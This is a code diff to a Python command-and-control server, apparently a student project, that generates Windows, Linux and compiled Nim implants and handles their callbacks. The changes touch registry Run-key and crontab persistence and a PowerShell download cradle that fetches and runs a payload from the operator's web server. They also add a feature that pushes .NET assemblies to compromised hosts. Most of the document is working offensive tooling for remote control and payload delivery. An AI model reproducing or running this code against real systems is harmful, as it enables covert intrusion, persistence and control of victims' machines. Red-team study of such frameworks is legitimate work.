@@ -7,13 +7,13 @@ import string, random, os
 import os.path
 import shutil
 import subprocess
-import sys
 import fcntl
 import struct
 from http.server import HTTPServer, SimpleHTTPRequestHandler
 import http.server
 import base64
 import randomname
+
 def banner():
     print('╔═╗┬─┐┬┌┬┐┬ ┬┌─┐  ╔═╗2')
     print('╠═╝├┬┘│││││ │└─┐  ║  By Oliver Albertsen')
@@ -28,7 +28,7 @@ def help():
     listeners -g                --> Generate a new listener on desired interface
     winplant                    --> Generate a Windows Python Payload
     linplant                    --> Generate a linux Python Payload
-    PLACEHOLDER                 --> Generate a compiled exe payload with advanced capabilities for windows
+    nimplant                    --> Generate a compiled exe payload written in nim with advanced capabilities for windows
     sessions -l                 --> List callbacks
     sessions -i <sessions_val>  --> Enter a callback session
     use <sessions_val>          --> Enter a callback session
@@ -48,7 +48,7 @@ def listener_handler(): # Function to handle incoming connections and send bytes
         sock.bind((host_ip, int(host_port)))
     except (OSError):
         print(f'[-] Adress already in use, please try another one')
-    print(f'[+] Awaiting callback from implants on {host_ip}:{host_port}')
+    print(f'[*] Awaiting callback from implants on {host_ip}:{host_port}')
     sock.listen()
     t1 = threading.Thread(target=comm_handler)
     t1.daemon = True
@@ -58,7 +58,7 @@ def listener_handler(): # Function to handle incoming connections and send bytes
     
 
 def comm_in(target_id):
-    print(f'[+] Awaiting response...')
+    print(f'[*] Awaiting response...')
     response = target_id.recv(4096).decode()
     response = base64.b64decode(response)
     response = response.decode().strip()
@@ -76,8 +76,8 @@ def comm_out(target_id, message):
 
 def kill_signal(target_id, message):
     message = str(message)
-    message = base64.b64encode(bytes(message, encoding='utf-8'))
-    target_id.send(message)
+    #message = base64.b64encode(bytes(message, encoding='utf-8'))
+    target_id.send(message.encode())
 
 def target_comm(target_id, targets, num):
     while True:
@@ -97,7 +97,7 @@ def target_comm(target_id, targets, num):
             if message == 'background\n':
                 break
             if message == 'persist\n':
-                payload_n = input('[+] Enter the name of the payload to add to persist: ')
+                payload_n = input('[*] Enter the name of the payload to add to persist: ')
                 if targets[num] [6] == 1:
                     ran_name = randomname.get_name()
                     persist1 = f'copy {payload_n} C:\\Users\\Public'
@@ -108,13 +108,24 @@ def target_comm(target_id, targets, num):
                     #persist2 = base64.b64encode(persist2.encode())
                     #target_id.send(persist2.encode())
                     comm_out(target_id, persist2)
-                    print('[+] Run the following command to cleanup the registry key: \nreg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v screendoor /f')
+                    print(f'[*] Run the following command to cleanup the registry key: \nreg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v {ran_name} /f')
                     print('[+] The persistance technique has completed')
+            if message == 'execute-asm\n':
+                asm_name = input('[*] Enter the name of the .NET executable[<name>.byte]: ')
+                file_loc = os.path.expanduser(f'~/Bachelor_C2/C2/Payloads/{asm_name}')
+                if os.path.exists(file_loc):
+                    with open(file_loc, 'r') as file:
+                        data = file.read()
+                    
+                    comm_out(target_id, data)
+
+
+
                 if targets[num][6] == 2:
                     persist_command = f'echo "@hourly python3 /home/{targets[num][3]}/{payload_n}" | crontab -'
                     persist_command = base64.b64encode(persist_command.encode())
                     target_id.send(persist_command.encode())
-                    print('[+] Run the following command to clean up the crontab: \n crontab -r')
+                    print('[*] Run the following command to clean up the crontab: \n crontab -r')
                     print('[+] The persistance technique has completed')
             else:
                 response = comm_in(target_id)
@@ -182,7 +193,7 @@ def winplant():
         f.close()
     py_loc = os.path.join(implant_loc, f_name)
     if os.path.exists(py_loc):
-        print(f'{f_name} saved to {implant_loc}')
+        print(f'[+] {f_name} saved to {implant_loc}')
         
     else:
         print('[-] An error occurred while saving the implant')
@@ -211,11 +222,12 @@ def linplant():
         f.close()
     py_loc = os.path.join(implant_loc, f_name)
     if os.path.exists(py_loc):
-        print(f'{f_name} saved to {implant_loc}')
+        print(f'[+] {f_name} saved to {implant_loc}')
 
 def nimplant():
     random_name = randomname.get_name()
-    f_name= f'{randomname.get_name()}.nim'
+    compile_name = (''.join(random.choices(string.ascii_lowercase, k=7)))
+    f_name= f'{compile_name}.nim'
     exe_file = f'{random_name}.exe'
     file_loc = os.path.expanduser('~/Bachelor_C2/implant/implant.nim')
     implant_loc = os.path.expanduser('~/Bachelor_C2/C2/Generated_Implants')
@@ -234,17 +246,17 @@ def nimplant():
     with open(f'{implant_loc}/{f_name}', 'w') as f:
         f.write(patch_port)
         f.close()
-    compile_cmd = [f"nim", "c", "-d:mingw", "--cpu:amd64", f"-o:{implant_loc}/{exe_file}", f"{implant_loc}/{f_name}"]
+    compile_cmd = [f"nim", "c", "-d:mingw", "--cpu:amd64",f"-o:{implant_loc}/{exe_file}", f"{implant_loc}/{f_name}"]
     print(f'[*] Compiling executeable {exe_file}...')
-    process = subprocess.Popen(compile_cmd)
+    process = subprocess.Popen(compile_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     process.wait()
     implant_loc = os.path.join(implant_loc, exe_file)
     if os.path.exists(implant_loc):
-        print(f'{exe_file} saved to {implant_loc}')
-        
+        print(f'[+] {exe_file} saved to {implant_loc}')   
     else:
         print('[-] An error occurred while compiling the implant')
-
+    implant_loc = os.path.expanduser('~/Bachelor_C2/C2/Generated_Implants')
+    os.remove(f'{implant_loc}/{f_name}')
 def resolve_ip(interface):
     
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -266,7 +278,7 @@ def pwsh_cradle():
             random_exe = (''.join(random.choices(string.ascii_lowercase, k=6)))
             random_exe = f'{random_exe}.exe'
             payload_loc = os.path.expanduser('~/Bachelor_C2/C2/Payloads')
-            print(f'[+] Payload server available at {host_ip}:8999')
+            print(f'[*] Payload server available at {host_ip}:8999')
             runner_cal_unencoded = f"iex (new-object net.webclient).downloadstring('http://{host_ip}:8999/Payloads/{runner_file}')".encode('utf-16le')
             with open(runner_file, 'w') as f:
                 f.write(f'powershell -c wget http://{host_ip}:8999/Payloads/{payload_name} -outfile {random_exe};Start-Process -FilePath {random_exe} ')
@@ -283,18 +295,17 @@ def pwsh_cradle():
         print(f'[*] Payload server not running yet.. start listener: <listener -g>')
 
 def web_payload_server():
+    
     http_handler = SimpleHTTPRequestHandler
-    http_handler.log_message = lambda a, b, c, d, e: None
+    http_handler.log_message = lambda *args, **kwargs: None
     server = http.server.ThreadingHTTPServer((host_ip, 8999), http_handler)
     
     print(f'[+] Payload server is running at http://{host_ip}:8999')
     thread = threading.Thread(target = server.serve_forever)
     thread.daemon = True
     thread.start()
-
-
-
-
+    
+       
 
    
 if __name__ == '__main__':
